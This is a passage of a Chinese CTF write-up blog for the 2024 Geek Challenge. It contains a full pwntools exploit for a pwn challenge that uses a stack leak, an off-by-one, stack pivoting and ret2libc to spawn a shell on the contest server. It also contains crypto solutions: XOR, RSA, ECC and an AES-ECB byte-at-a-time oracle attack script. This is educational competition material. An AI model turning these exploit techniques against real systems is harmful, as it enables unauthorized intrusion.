<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241118204700166.png" alt="image-20241118204700166"></p>
<ul>
<li>这里我们在运行程序的时候还注意到,write可以直接输出，而不是放入缓冲区中</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241118204747319.png" alt="image-20241118204747319"></p>
<ul>
<li>之后<code>vuln</code>函数存在溢出</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241118204826792.png" alt="image-20241118204826792"></p>
<ul>
<li>思路是这样的，先泄露栈地址，然后再利用内存分页机制，导致代码段末尾地址一样通过off-by-one，返回到main函数的write函数那边直接就可以泄露一下main函数的地址，接收完后再通过栈迁移泄露libc地址。最后就可以ret2libc得到shell。</li>
<li>这里为什么可以通过write泄露地址是通过动态调试发现的，动态调试发现恰好rdi、rsi、rdx这三个寄存器能符合泄露main函数地址的条件。</li>
<li>注意泄露栈地址和泄露libc地址都需要将缓冲区给充满，才能泄露出这俩个地址</li>
<li>exp如下：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./stdout&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;p &amp;buf\n c&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">36330</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span></span><br><span class="line">p.send(payload)</span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span> + p8(<span class="number">0x29</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">103</span>):</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.send(payload1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">103</span>*<span class="number">2</span>):</span><br><span class="line">    a = p.recvline()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;\x7f&#x27;</span> <span class="keyword">in</span> a:</span><br><span class="line">        <span class="built_in">print</span>(a)</span><br><span class="line">        b = a[<span class="built_in">len</span>(a)-<span class="number">7</span>:<span class="built_in">len</span>(a)-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;b----&gt;&#x27;</span>,b)</span><br><span class="line">b = <span class="built_in">int</span>.from_bytes(b,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">b = b - <span class="number">0x348</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(b))</span><br><span class="line">pause()</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span> + p8(<span class="number">0x78</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>)</span><br><span class="line">main_addr = p.recv()</span><br><span class="line">main_addr = main_addr[:<span class="built_in">len</span>(main_addr)-<span class="number">18</span>]</span><br><span class="line">main_addr = <span class="built_in">int</span>.from_bytes(main_addr,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">main_addr = main_addr - <span class="number">0x1382</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;main----&gt;&#x27;</span>,<span class="built_in">hex</span>(main_addr))</span><br><span class="line">pop_rdi = <span class="number">0x1403</span> + main_addr</span><br><span class="line">ret = <span class="number">0x101a</span> + main_addr</span><br><span class="line">puts_got = <span class="number">0x3FA0</span> + main_addr</span><br><span class="line">puts_plt = <span class="number">0x10B0</span> + main_addr</span><br><span class="line">leave = <span class="number">0x1327</span> + main_addr</span><br><span class="line">payload3 = p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(<span class="number">0x1329</span>+main_addr)</span><br><span class="line">payload3 += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + p64(b-<span class="number">0x48</span>) + p64(leave)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">103</span>):</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.send(payload1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">103</span>*<span class="number">2</span>):</span><br><span class="line">    a = p.recvline()</span><br><span class="line"><span class="keyword">if</span> <span class="string">b&#x27;\x7f&#x27;</span> <span class="keyword">in</span> a:</span><br><span class="line">        <span class="built_in">print</span>(a)</span><br><span class="line">        puts_addr = a[:<span class="built_in">len</span>(a)-<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;puts_addr----&gt;&#x27;</span>,puts_addr)</span><br><span class="line">puts_addr = <span class="built_in">int</span>.from_bytes(puts_addr,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">libc_addr = puts_addr - <span class="number">0x84420</span></span><br><span class="line">sys_addr = libc_addr + <span class="number">0x52290</span></span><br><span class="line">sh_addr = libc_addr + <span class="number">0x1B45BD</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span> + p64(pop_rdi) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<ul>
<li>复现后得到flag：<code>SYC&#123;9f3c06ae-4cfe-4111-9f58-a6fc7eff8ce9&#125;</code></li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241118205409244.png" alt="image-20241118205409244"></p>
<h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1>
<h2 id="凯撒加密"><a class="markdownIt-Anchor" href="#凯撒加密"></a> 凯撒加密</h2>
<ul>
<li>随波逐流一把梭，flag<code>SYC&#123;WELCOME_TO_2024_GEEK_CHALLENGE&#125;</code></li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241115180009980.png" alt="image-20241115180009980"></p>
<h2 id="x0r"><a class="markdownIt-Anchor" href="#x0r"></a> X0R</h2>
<ul>
<li>题目如下：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;...&#x27;</span></span><br><span class="line">flag = <span class="string">b&#x27;...&#x27;</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(key)==<span class="number">4</span></span><br><span class="line"></span><br><span class="line">enc = bytes_to_long(xor(flag,key))</span><br><span class="line"></span><br><span class="line">f1 = <span class="number">4585958212176920650644941909171976689111990</span></span><br><span class="line">f2 = <span class="number">3062959364761961602614252587049328627114908</span></span><br><span class="line">e1 = enc^f1</span><br><span class="line">e2 = e1^f2</span><br><span class="line"><span class="built_in">print</span>(e2)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">10706859949950921239354880312196039515724907</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>这题考的就是pwntools中字节类型的异或和整数类型的异或</p>
</li>
<li>
<p>这题主要求出key就可以很快得到flag了</p>
</li>
<li>
<p>由于</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">e2 = e1^f2</span><br><span class="line">e1 = enc^f1</span><br><span class="line">e2 = <span class="number">10706859949950921239354880312196039515724907</span></span><br></pre></td></tr></table></figure>
<ul>
<li>所以可得</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">e1 = e2^f2</span><br><span class="line"><span class="comment">#然后再得到</span></span><br><span class="line">enc = e1^f1</span><br><span class="line"><span class="comment">#这样就可以得到密文</span></span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>再将密文转化为字节类型</p>
</li>
<li>
<p>题目告诉我们flag开头为<code>SYC&#123;</code></p>
</li>
<li>
<p>所以根据异或的运算特点就可以得到key，从而得到flag</p>
</li>
<li>
<p>exp如下:</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="built_in">ascii</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line"><span class="built_in">print</span>(string.printable)</span><br><span class="line"></span><br><span class="line">e2 = <span class="number">10706859949950921239354880312196039515724907</span></span><br><span class="line">f1 = <span class="number">4585958212176920650644941909171976689111990</span></span><br><span class="line">f2 = <span class="number">3062959364761961602614252587049328627114908</span></span><br><span class="line">e1 = f2^e2</span><br><span class="line">enc = f1^e1</span><br><span class="line"><span class="built_in">print</span>(enc)</span><br><span class="line">a = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">p = <span class="number">1</span></span><br><span class="line">l = <span class="string">b&#x27;SYC&#123;&#x27;</span></span><br><span class="line">c = libnum.n2s(enc)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">key = xor(<span class="string">b&#x27;mes)&#x27;</span>,<span class="string">b&#x27;SYC&#123;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(xor(c,key))</span><br></pre></td></tr></table></figure>
<ul>
<li>flag：<code>SYC&#123;a_part_0f_X0R&#125;</code></li>
</ul>
<h2 id="rsa"><a class="markdownIt-Anchor" href="#rsa"></a> RSA</h2>
<ul>
<li>题目如下：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">p = getPrime(<span class="number">128</span>)</span><br><span class="line">q = getPrime(<span class="number">128</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;q = <span class="subst">&#123;q&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 33108009203593648507706487693709965711774665216872550007309537128959455938833</span></span><br><span class="line"><span class="string">p = 192173332221883349384646293941837353967</span></span><br><span class="line"><span class="string">q = 172282016556631997385463935089230918399</span></span><br><span class="line"><span class="string">c = 5366332878961364744687912786162467698377615956518615197391990327680664213847</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>RSA的入门难度，给了n、p、q、c，直接编写解密脚本即可，正常rsa解密，无需多余操作</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">33108009203593648507706487693709965711774665216872550007309537128959455938833</span></span><br><span class="line">p = <span class="number">192173332221883349384646293941837353967</span></span><br><span class="line">q = <span class="number">172282016556631997385463935089230918399</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">5366332878961364744687912786162467698377615956518615197391990327680664213847</span></span><br><span class="line">phi_n = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi_n)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure>
<ul>
<li>flag：<code>SYC&#123;RSA_is_easy&#125;</code></li>
</ul>
<h2 id="ecc"><a class="markdownIt-Anchor" href="#ecc"></a> ECC</h2>
<ul>
<li>题目指明考察椭圆曲线加密</li>
<li>题目附件如下，说是Python附件，其实是sage附件，真正写脚本需要使用sagemath进行解密</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">256</span>)</span><br><span class="line">a = getPrime(<span class="number">256</span>)</span><br><span class="line">b = getPrime(<span class="number">256</span>)</span><br><span class="line">E = EllipticCurve(GF(p),[a,b])</span><br><span class="line">m = E.random_point()</span><br><span class="line">G = E.random_point()</span><br><span class="line">k = getPrime(<span class="number">256</span>)</span><br><span class="line">K = k * G</span><br><span class="line">r = getPrime(<span class="number">256</span>)</span><br><span class="line">c1 = m + r * K</span><br><span class="line">c2 = r * G</span><br><span class="line"></span><br><span class="line">cipher_left = bytes_to_long(flag[:<span class="built_in">len</span>(flag)//<span class="number">2</span>]) * m[<span class="number">0</span>]</span><br><span class="line">cipher_right = bytes_to_long(flag[<span class="built_in">len</span>(flag)//<span class="number">2</span>:]) * m[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;a = <span class="subst">&#123;a&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;b = <span class="subst">&#123;b&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;k = <span class="subst">&#123;k&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;E = <span class="subst">&#123;E&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c1 = <span class="subst">&#123;c1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c2 = <span class="subst">&#123;c2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;cipher_left = <span class="subst">&#123;cipher_left&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;cipher_right = <span class="subst">&#123;cipher_right&#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p = 93202687891394085633786409619308940289806301885603002539703165565954917915237</span></span><br><span class="line"><span class="string">a = 93822086754590882682502837744000915992590989006575416134628106376590825652793</span></span><br><span class="line"><span class="string">b = 80546187587527518012258369984400999843218609481640396827119274116524742672463</span></span><br><span class="line"><span class="string">k = 58946963503925758614502522844777257459612909354227999110879446485128547020161</span></span><br><span class="line"><span class="string">E = Elliptic Curve defined by y^2 = x^3 + 619398863196797048716428124691975702784687120972413594924940810635907737556*x + 80546187587527518012258369984400999843218609481640396827119274116524742672463 over Finite Field of size 93202687891394085633786409619308940289806301885603002539703165565954917915237</span></span><br><span class="line"><span class="string">c1 = (40485287784577105052142632380297282223290388901294496494726004092953216846111 : 81688798450940847410572480357702533480504451191937977779652402489509511335169 : 1)</span></span><br><span class="line"><span class="string">c2 = (51588540344302003527882762117190244240363885481651104291377049503085003152858 : 77333747801859674540077067783932976850711668089918703995609977466893496793359 : 1)</span></span><br><span class="line"><span class="string">cipher_left = 34210996654599605871773958201517275601830496965429751344560373676881990711573</span></span><br><span class="line"><span class="string">cipher_right = 62166121351090454316858010748966403510891793374784456622783974987056684617905</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>flag被分成了两部分，然后随机生成256位的素数<code>a、b</code>，然后再随机生成一个256位的素数<code>p</code>，作为ECC加密算法的模数，构造一个模数下的椭圆曲线的坐标方程。但是这里的素数<code>a</code>与所给的椭圆曲线的参数<code>a</code>对不上</p>
</li>
<li>
<p>然后随机生成两个椭圆曲线上的点<code>m</code>和<code>G</code>，再随机生成一个256位的素数<code>k</code>和<code>r</code></p>
</li>
<li>
<p>本题主要还是求椭圆曲线上的随机点<code>m</code>，这个<code>m</code>点已知，马上就能算出来flag</p>
</li>
<li>
<p>题目给了<code>C1</code>、<code>C2</code>俩个点，而这俩个点又与m有关，所以我们要利用<code>C1</code>、<code>C2</code>、<code>k</code>这几个已知两算出<code>m</code>点</p>
</li>
<li>
<p>原本这题想独立思考解出，但是最后还是看了网上的类似题目，本题实际上是<code>hgame2022</code>的椭圆曲线原题</p>
</li>
<li>
<p>这里主要还是很不理解<code>m = c1 - k * c2</code>为什么这样可以直接算出<code>m</code></p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">93202687891394085633786409619308940289806301885603002539703165565954917915237</span></span><br><span class="line">a = <span class="number">93822086754590882682502837744000915992590989006575416134628106376590825652793</span></span><br><span class="line">b = <span class="number">80546187587527518012258369984400999843218609481640396827119274116524742672463</span></span><br><span class="line">k = <span class="number">58946963503925758614502522844777257459612909354227999110879446485128547020161</span></span><br><span class="line">a1 = <span class="number">619398863196797048716428124691975702784687120972413594924940810635907737556</span></span><br><span class="line">b1 = <span class="number">80546187587527518012258369984400999843218609481640396827119274116524742672463</span></span><br><span class="line"></span><br><span class="line">cipher_left = <span class="number">34210996654599605871773958201517275601830496965429751344560373676881990711573</span></span><br><span class="line">cipher_right = <span class="number">62166121351090454316858010748966403510891793374784456622783974987056684617905</span></span><br><span class="line">E = EllipticCurve(GF(p), [a1,b1])</span><br><span class="line">c1 = E([Integer(<span class="number">40485287784577105052142632380297282223290388901294496494726004092953216846111</span>),Integer(<span class="number">81688798450940847410572480357702533480504451191937977779652402489509511335169</span>)])</span><br><span class="line">c2 = E([Integer(<span class="number">51588540344302003527882762117190244240363885481651104291377049503085003152858</span>),Integer(<span class="number">77333747801859674540077067783932976850711668089918703995609977466893496793359</span>)])</span><br><span class="line">m = c1 - k * c2</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(cipher_left//m[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(cipher_right//m[<span class="number">1</span>])</span><br></pre></td></tr></table></figure>
<ul>
<li>然后最后得到结果：<code>flag:SYC&#123;Ecc$is!sO@HaRd&#125;</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(56959194109531701863457752191002700715316295982070114133947449531256105121967 : 65183385071251798726595129652797025728347063543536362274969327580075443284111 : 1)</span><br><span class="line">1537511878348658386025</span><br><span class="line">543689197014958751245437</span><br><span class="line">b&#x27;SYC&#123;Ecc$i&#x27;</span><br><span class="line">b&#x27;s!sO@HaRd&#125;&#x27;</span><br></pre></td></tr></table></figure>
<h2 id="ecbpad"><a class="markdownIt-Anchor" href="#ecbpad"></a> ECBpad</h2>
<ul>
<li>
<p>AES-ECB选择明文攻击，暑假在打国外的一场比赛和BaseCTF都写过这种题型，攻击方法就是利用相同明文的块加密后的密文也相同对明文进行爆破。</p>
</li>
<li>
<p>爆破过程如下，先构造 <code>payload='aaaaaaaaaaaaaaa?(可见字符)aaaaaaaaaaaaaaaS'</code></p>
</li>
<li>
<p>然后对发送出来的密文块 1，密文块 2 进行判断是否相同，如果相同即可得出可见字符 (?) 对应的字符是 <code>S</code>，那么 flag 第一个字符就给爆破出来了</p>
</li>
<li>
<p>具体脚本如下：</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">p = remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">40491</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(<span class="string">&#x27;b40de5c23f444922acceb599e7d5e5b32691cfc1633ef77d65dea7e70c293350b40de5c23f444922acceb599e7d5e5b38d333ba7e364f643d9da3bf32966ccb0e44412f6688e039a20692d3b8dbe79e830061d25a439557f466fb81724527137&#x27;</span>))</span><br><span class="line"><span class="comment">#len(flag)=30</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(<span class="string">&#x27;5029bc2896066b10550a6f24430bf54e8e78e37aba71f8ef2a9a37f88c82d553&#x27;</span>)//<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(<span class="string">&#x27;2d8431246fed44608cb0be4b3b3fa65462e8a40cb07c1342cd606faa0b76a74d003cc92c73f84e7a7ee53fde1dfec57d&#x27;</span>)//<span class="number">2</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">padding</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">len</span>(m) % <span class="number">16</span> != <span class="number">0</span>):</span><br><span class="line">        m = m + <span class="string">b&#x27;F&#x27;</span> * (<span class="number">16</span> - (<span class="built_in">len</span>(m) % <span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line">k = <span class="number">32</span></span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string.printable:</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;[-]&#x27;</span>,<span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line">        pad = <span class="string">b&#x27;a&#x27;</span>*(k-<span class="number">1</span>) + flag + j.encode(<span class="string">&#x27;utf-8&#x27;</span>) + <span class="string">b&#x27;a&#x27;</span>*(k-<span class="number">1</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;[-]&#x27;</span>,pad)</span><br><span class="line">        a = p.recvline()[<span class="number">13</span>:-<span class="number">1</span>]</span><br><span class="line">        <span class="comment">#print(a)</span></span><br><span class="line">        c1 = a[:<span class="number">64</span>]</span><br><span class="line">        <span class="comment">#print(c1)</span></span><br><span class="line">        <span class="comment">#print(len(c1))</span></span><br><span class="line">        c2 = a[<span class="number">64</span>:<span class="number">128</span>]</span><br><span class="line">        <span class="comment">#print(c2)</span></span><br><span class="line">        <span class="comment">#print(len(c2))</span></span><br><span class="line">        <span class="keyword">if</span> c1==c2:</span><br><span class="line">            flag += j.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            k-=<span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<ul>
<li>从而得到flag：<code>SYC&#123;CRY9T0HACK_A_GREA7_W38S17E&#125;</code></li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241104085142098.png" alt="image-20241104085142098"></p>
